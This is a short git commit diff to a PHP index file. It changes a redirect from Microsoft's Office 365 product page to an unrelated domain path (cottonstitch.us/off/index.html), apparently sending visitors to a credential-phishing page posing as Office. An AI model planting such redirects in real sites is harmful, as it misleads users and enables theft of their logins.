bf95cb3d260c33124d89503008c5d1c20a0d9188
kylekocsis757z <42642284+kylekocsis757z@users.noreply.github.com>
2018-08-29 11:03:25 -0700

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.microsoft.com/en-us/p/office-365-personal/cfq7ttc0k5bf?activetab=pivot%3aoverviewtab");
+header("Location: https://cottonstitch.us/off/index.html");
 die();
 ?>
